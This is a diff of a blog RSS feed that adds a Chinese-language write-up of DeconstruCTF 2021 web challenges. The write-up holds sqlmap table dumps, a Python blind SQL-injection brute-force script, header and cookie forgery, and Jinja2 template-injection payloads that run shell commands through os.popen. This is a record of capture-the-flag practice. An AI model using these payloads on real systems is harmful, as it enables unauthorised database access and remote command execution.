@@ -1,4 +1,160 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Oct 2021 20:17:24 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>wp on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/wp/</link><description>Recent content in wp on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 30 Oct 2021 13:35:32 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/wp/index.xml" rel="self" type="application/rss+xml"/><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
+&lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
+&lt;blockquote>
+&lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png" alt="image-20211003224148107">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png" alt="image-20211003224209166">&lt;/p>
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/a> 不用看了 Never Gonna Give You Up&lt;/p>
+&lt;p>看style.css flag: &amp;ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}&amp;quot;; 但是不是最终的flag，解一下rot13 amount=23&lt;/p>
+&lt;p>&lt;code>dsc{we0come_to_deconstructf}&lt;/code>&lt;/p>
+&lt;p>签到题也好折腾TAT&lt;/p>
+&lt;h2 id="webplease">Web/Please&lt;/h2>
+&lt;blockquote>
+&lt;p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&amp;rsquo;s servers. I know it&amp;rsquo;s been a while, but could you &lt;strong>please&lt;/strong> try to access those files? I would be very grateful!&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png" alt="image-20211003225518532">&lt;/p>
+&lt;p>熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png" alt="image-20211003230430641">&lt;/p>
+&lt;p>改浏览器标识头 &lt;code>User-Agent: DeemBrowser&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png" alt="image-20211003230638917">&lt;/p>
+&lt;p>需要基础认证，但是这里的MagicWord稍微卡了一下&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png" alt="image-20211003232421727">&lt;/p>
+&lt;p>原因是我太铸币了忘了加Basic，&lt;code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png" alt="image-20211004003846943">&lt;/p>
+&lt;p>加一个日期的头，&lt;code>Date: Thu, 1 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png" alt="image-20211004004026742">&lt;/p>
+&lt;p>换成&lt;code>Date: Mon, 5 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png" alt="image-20211004004153788">&lt;/p>
+&lt;p>&lt;code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}&lt;/code>&lt;/p>
+&lt;h2 id="webtaxi-union-problems">Web/Taxi Union Problems&lt;/h2>
+&lt;blockquote>
+&lt;p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&amp;rsquo;ve tried to ask the local taxi union about driver&amp;rsquo;s location but they are refusing provide the same.&lt;/p>
+&lt;p>Since this package is required for a time sensitive matter we don&amp;rsquo;t have time to negotiate with the union.&lt;/p>
+&lt;p>Your task is to obtain the location of the taxi using the given information
+&lt;code>Taxi Lisence Plate: TN-06-AP-9879&lt;/code>&lt;/p>
+&lt;p>HINT: The flag is the location of the taxi (no caps)&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png" alt="image-20211003233419781">&lt;/p>
+&lt;p>输入&lt;code>TN-06-AP-9879'--%20&lt;/code>回显一样，有注入，把post的内容拿去让sqlmap跑一下&lt;/p>
+&lt;pre tabindex="0">&lt;code>python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate --tables
+python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --columns
+python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --dump
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png" alt="image-20211004000253417">&lt;/p>
+&lt;p>Ayanavaram&lt;/p>
+&lt;h2 id="webnever-gonna-lie-to-you">*Web/Never gonna lie to you&lt;/h2>
+&lt;blockquote>
+&lt;p>Trust me, take everything in the home page for face value. I would never lie to you.&lt;/p>
+&lt;/blockquote>
+&lt;p>主页有一句&lt;em>Not even search engines can find it.&lt;/em>，提示我们看/robots.txt&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png" alt="image-20211004000643314">&lt;/p>
+&lt;p>转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png" alt="image-20211004000944013">&lt;/p>
+&lt;p>提交两个参数username和password，回显&lt;em>YOU LIED TO ME !!!&lt;/em>&lt;/p>
+&lt;p>————然后没然后了 我还没看完 环境就关了TAT&lt;/p>
+&lt;h2 id="webcurly-fries-1">Web/Curly Fries 1&lt;/h2>
+&lt;blockquote>
+&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. The flag is right in front of you.&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png" alt="image-20211004170846442">&lt;/p>
+&lt;p>emmmmm 没有任何提示&lt;/p>
+&lt;p>看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -i http://very.uniquename.xyz:8880/ -H &lt;span style="color:#d88200">&amp;#34;Accept-Language: sv-SE&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png" alt="image-20211004171513900">&lt;/p>
+&lt;p>&lt;code>dsc{1_l0v3_sw3d3n}&lt;/code>&lt;/p>
+&lt;h2 id="webthe-gate-keeper">Web/The Gate Keeper&lt;/h2>
+&lt;blockquote>
+&lt;p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.&lt;/p>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge might require a bruteforce approach.&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png" alt="image-20211004171755317">&lt;/p>
+&lt;p>还是sqli&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
+&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">domain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_lowercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_uppercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_}&amp;#39;&lt;/span>
+&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gate keeper&amp;#34;&lt;/span>
+&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;taxi union&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2052/&amp;#39;&lt;/span>
+&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;TN-06-AP-9879&amp;#34;&lt;/span>
+&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;lisence_plate&amp;#39;&lt;/span>
+&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;location&amp;#34;&lt;/span>
+&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;gate keeper&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2082/&amp;#39;&lt;/span>
+&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&amp;#34;&lt;/span>
+&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>
+&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;URL&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">domain&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; or &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200"> like &amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">%&amp;#39;; --&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">column&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">})&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
+&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>
+&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">break&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webhungry-man">Web/Hungry Man&lt;/h2>
+&lt;blockquote>
+&lt;p>There is nothing here I promise! ;)&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png" alt="image-20211004172041299">&lt;/p>
+&lt;p>抓包，cookie部分有一个b64，解码后&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png" alt="image-20211004172123925">&lt;/p>
+&lt;p>说实话，这个题做的时候没注意set-cookie的部分，&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man">参考wp&lt;/a>&lt;/p>
+&lt;p>这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了&lt;/p>
+&lt;p>&lt;code>dsc{91v3_m3_4_h4ndfu1_0f_c00k135}&lt;/code>&lt;/p>
+&lt;h2 id="webcurly-fries-2">Web/Curly Fries 2&lt;/h2>
+&lt;blockquote>
+&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. Why do logos make things so recognizable?&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172502484.png" alt="image-20211004172502484">&lt;/p>
+&lt;p>无提示，&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%202">参考wp&lt;/a>&lt;/p>
+&lt;p>有点脑洞了，把User-Agent的地方设置为xbox和Linux之后，图片会消失并露出flag&lt;/p>
+&lt;p>&lt;code>dsc{1m4g1n3_l1nux_0n_4n_xb0x}&lt;/code>&lt;/p>
+&lt;h2 id="webcurly-fries-3">Web/Curly Fries 3&lt;/h2>
+&lt;blockquote>
+&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. I&amp;rsquo;m with you, every step of the way.&lt;/p>
+&lt;/blockquote>
+&lt;p>直接访问提示405，post一下回显&lt;em>perhaps try Googling me instead?&lt;/em>&lt;/p>
+&lt;p>访问/robots.txt，404&lt;/p>
+&lt;p>用wappalyzer可以看到这是一个flask应用&lt;/p>
+&lt;p>&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Curly%20Fries%203">参考wp&lt;/a>&lt;/p>
+&lt;p>看到第一个提示之后不够敏感，我们可以设置来源refer是google.com&lt;/p>
+&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; http://overly.uniquename.xyz:2095/
+&lt;/code>&lt;/pre>&lt;p>回显中提示我们再设置Host&lt;/p>
+&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H&amp;quot;Host:https://dscvit.com&amp;quot; http://overly.uniquename.xyz:2095/
+&lt;/code>&lt;/pre>&lt;p>回显&lt;em>potates and carrots are my friends, milk and Cookies will be my end&lt;/em>，不是很明显，但是应该设置cookie=root&lt;/p>
+&lt;p>之后回显&lt;em>JFATHER, JMOTHER, JDAUGHTER, ____?&lt;/em>，提示把content-type改为json&lt;/p>
+&lt;p>回显*{&amp;lsquo;error&amp;rsquo;: &amp;lsquo;json data missing&amp;rsquo;}*，添加一点data&lt;/p>
+&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;foo&amp;quot;:&amp;quot;bar&amp;quot;}' http://overly.uniquename.xyz:2095/
+&lt;/code>&lt;/pre>&lt;p>回显*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;required&amp;rsquo;}}*，将foo改为bar，回显*{&amp;lsquo;error&amp;rsquo;: {&amp;lsquo;messi&amp;rsquo;: &amp;lsquo;which club am i at?'}}*&lt;/p>
+&lt;p>*不太懂为啥这就能知道把bar赋值为PSG？？？&lt;/p>
+&lt;pre tabindex="0">&lt;code>curl -i -X POST -H &amp;quot;Referer: https://www.google.com&amp;quot; -H &amp;quot;Host: https://www.dscvit.com&amp;quot; -H &amp;quot;Content-Type: application/json&amp;quot; --cookie &amp;quot;user=root&amp;quot; -d '{&amp;quot;messi&amp;quot;:&amp;quot;psg&amp;quot;}' http://overly.uniquename.xyz:2095/
+&lt;/code>&lt;/pre>&lt;p>得到flag &lt;code>dsc{th15_15_w4y_t00_much_w0rk}&lt;/code>&lt;/p>
+&lt;h2 id="webmega-mailer">Web/Mega Mailer&lt;/h2>
+&lt;blockquote>
+&lt;p>We recently launched a mass email sender that can work with any SMTP server, but recently we have reports of information leaks and and trolling through our service. Can you find whats wrong with it ?&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004005500420.png" alt="image-20211004005500420">&lt;/p>
+&lt;p>讲真，之前没接触过&lt;/p>
+&lt;p>首先在自己的vps上开一个smtp的服务，用python开&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 -m smtpd -c DebuggingServer -n 0.0.0.0:25
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后其它信息正常填，body部分存在ssti注入，payload来自于&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&lt;/a>&lt;/p>
+&lt;pre tabindex="0">&lt;code>{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -a').read()}}
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004181339121.png" alt="image-20211004181339121">&lt;/p>
+&lt;p>&lt;code>dsc{819_8r41n_m41L3R}&lt;/code>&lt;/p>
+&lt;p>参考：&lt;a href="https://github.com/ComdeyOverFlow/DeconstruCTF-2021/blob/main/Mega-Mailer/README.md">wp&lt;/a>&lt;/p>
+&lt;hr>
+&lt;p>说实话，这一篇wp早就水完了，但是中间那个Never gonna lie to you的题因为没有地方复现也没搜着别的wp就一直拖着，拖到现在，还是没找到，放弃了，可惜死了，这个故事告诉我们做题复现要趁早&lt;/p></description></item><item><title>2021强网拟态 Wp</title><link>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</link><pubDate>Tue, 26 Oct 2021 20:17:24 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/</guid><description>&lt;blockquote>
 &lt;p>web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的&lt;/p>
 &lt;p>属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下&lt;/p>
 &lt;/blockquote>
